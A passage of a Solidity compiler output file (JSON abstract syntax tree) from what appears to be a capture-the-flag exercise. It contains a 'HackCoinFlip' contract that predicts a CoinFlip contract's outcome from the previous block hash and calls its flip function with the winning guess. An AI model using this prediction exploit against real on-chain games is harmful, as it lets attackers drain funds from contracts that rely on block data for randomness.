																"nodeType": "Literal",
																"src": "668:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "661:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "317:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "317:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "316:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "346:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "346:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "345:6:0"
									},
									"scope": 81,
									"src": "303:445:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 82,
							"src": "62:689:0"
						}
					],
					"src": "33:718:0"
				},
				"id": 0
			},
			"contracts/hackcoinflip.sol": {
				"ast": {
					"absolutePath": "contracts/hackcoinflip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						],
						"HackCoinFlip": [
							140
						]
					},
					"id": 141,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:1"
						},
						{
							"absolutePath": "contracts/coinflip.sol",
							"file": "./coinflip.sol",
							"id": 84,
							"nodeType": "ImportDirective",
							"scope": 141,
							"sourceUnit": 82,
							"src": "58:24:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 140,
							"linearizedBaseContracts": [
								140
							],
							"name": "HackCoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "53b3b3b3",
									"id": 87,
									"mutability": "mutable",
									"name": "coinFlipContract",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "116:32:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_CoinFlip_$81",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"id": 86,
										"nodeType": "UserDefinedTypeName",
										"pathNode": {
											"id": 85,
											"name": "CoinFlip",
											"nodeType": "IdentifierPath",
											"referencedDeclaration": 81,
											"src": "116:8:1"
										},
										"referencedDeclaration": 81,
										"src": "116:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$81",
											"typeString": "contract CoinFlip"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 90,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 140,
									"src": "155:94:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 88,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "155:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 89,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "172:77:1",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 101,
										"nodeType": "Block",
										"src": "303:65:1",
										"statements": [
											{
												"expression": {
													"id": 99,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 95,
														"name": "coinFlipContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 87,
														"src": "314:16:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"arguments": [
															{
																"id": 97,
																"name": "_coinFlipContract",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 92,
																"src": "342:17:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 96,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "333:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$81_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 98,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "333:27:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$81",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "314:46:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$81",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 100,
												"nodeType": "ExpressionStatement",
												"src": "314:46:1"
											}
										]
									},
									"id": 102,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 93,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 92,
												"mutability": "mutable",
												"name": "_coinFlipContract",
												"nodeType": "VariableDeclaration",
												"scope": 102,
												"src": "270:25:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 91,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "270:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "269:27:1"
									},
									"returnParameters": {
										"id": 94,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "303:0:1"
									},
									"scope": 140,
									"src": "258:110:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 138,
										"nodeType": "Block",
										"src": "402:216:1",
										"statements": [
											{
												"assignments": [
													106
												],
												"declarations": [
													{
														"constant": false,
														"id": 106,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "415:18:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 105,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "415:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 116,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 113,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 110,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "454:5:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 111,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "454:12:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 112,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "467:1:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "454:14:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 109,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "444:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 114,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "444:25:1",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 108,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "436:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 107,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "436:7:1",
															"typeDescriptions": {}
														}
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "436:34:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "415:55:1"
											},
											{
												"assignments": [
													118
												],
												"declarations": [
													{
														"constant": false,
														"id": 118,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "481:16:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 117,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "481:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 122,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 121,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 119,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 106,
														"src": "500:10:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 120,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 90,
														"src": "511:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "500:17:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "481:36:1"
											},
											{
												"assignments": [
													124
												],
												"declarations": [
													{
														"constant": false,
														"id": 124,
														"mutability": "mutable",
														"name": "guess",
														"nodeType": "VariableDeclaration",
														"scope": 138,
														"src": "528:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 123,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "528:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 131,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 127,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 125,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 118,
															"src": "541:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 126,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "553:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "541:13:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 129,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "564:5:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 130,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "541:28:1",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 128,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "557:4:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "528:41:1"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 135,
															"name": "guess",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 124,
															"src": "604:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"id": 132,
															"name": "coinFlipContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 87,
															"src": "582:16:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$81",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 134,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 80,
														"src": "582:21:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "582:28:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 137,
												"nodeType": "ExpressionStatement",
												"src": "582:28:1"
											}
										]
									},
									"functionSelector": "931c9f32",
									"id": 139,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "makeGuess",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 103,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "392:2:1"
									},
									"returnParameters": {
										"id": 104,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "402:0:1"
									},
									"scope": 140,
									"src": "374:244:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 141,
							"src": "86:535:1"
						}
					],
					"src": "33:588:1"
				},
				"id": 1
			}
		}
	}
}